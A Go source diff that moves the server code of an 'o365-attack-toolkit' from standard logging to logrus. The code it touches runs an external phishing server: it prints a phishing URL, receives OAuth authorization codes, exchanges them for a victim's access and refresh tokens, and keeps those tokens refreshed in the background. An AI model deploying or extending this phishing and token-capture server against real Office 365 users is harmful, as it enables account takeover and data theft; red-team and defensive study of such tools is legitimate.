@@ -3,10 +3,13 @@ package server
 import (
 	"encoding/json"
 	"fmt"
-	"log"
 	"net/http"
 
+	"github.com/sirupsen/logrus"
+	//log "github.com/sirupsen/logrus"
+
 	"github.com/vitorallo/o365-attack-toolkit/api"
+	"github.com/vitorallo/o365-attack-toolkit/logging"
 	"github.com/vitorallo/o365-attack-toolkit/model"
 
 	"github.com/gorilla/mux"
@@ -15,9 +18,10 @@ import (
 func StartIntServer(config model.Config) {
 
 	// Start the update token function
-	go api.RecursiveTokenUpdate()
 
-	log.Printf("Starting Internal Server on 127.0.0.1:%d \n", config.Server.InternalPort)
+	go api.RecursiveTokenUpdate(logging.GetLogger())
+
+	logging.Log.Info(fmt.Sprintf("Starting internal Server on %s:%d", config.Server.Host, config.Server.InternalPort))
 
 	route := mux.NewRouter()
 
@@ -60,10 +64,10 @@ func StartIntServer(config model.Config) {
 
 }
 
-func StartExtServer(config model.Config) {
+func StartExtServer(config model.Config, l *logrus.Logger) {
 	url := api.GenerateURL()
-	log.Printf("phishing URL: %v", url)
-	log.Printf("Starting External Server on %s:%d \n", config.Server.Host, config.Server.ExternalPort)
+	l.Info("[Routine] Phishing URL: ", url)
+	l.Info(fmt.Sprintf("[Routine] Starting external Server on %s:%d", config.Server.Host, config.Server.ExternalPort))
 	route := mux.NewRouter()
 	route.HandleFunc(model.ExtTokenPage, GetToken).Methods("GET")
 	route.PathPrefix(model.ExtMainPage).Handler(http.FileServer(http.Dir("./static/")))
@@ -81,14 +85,13 @@ func GetToken(w http.ResponseWriter, r *http.Request) {
 	r.ParseForm()
 
 	if r.FormValue("error") != "" {
-		log.Printf("Error %s : %s\n", r.FormValue("error"), r.FormValue("error_description"))
+		logging.Log.Printf("Error %s : %s\n", r.FormValue("error"), r.FormValue("error_description"))
 	} else {
 
 		jsonData := api.GetAllTokens(r.FormValue("code"))
 		if jsonData != nil {
 			authResponse := model.AuthResponse{}
 			json.Unmarshal(jsonData, &authResponse)
-
 			api.InitializeProfile(authResponse.AccessToken, authResponse.RefreshToken)
 		}
 
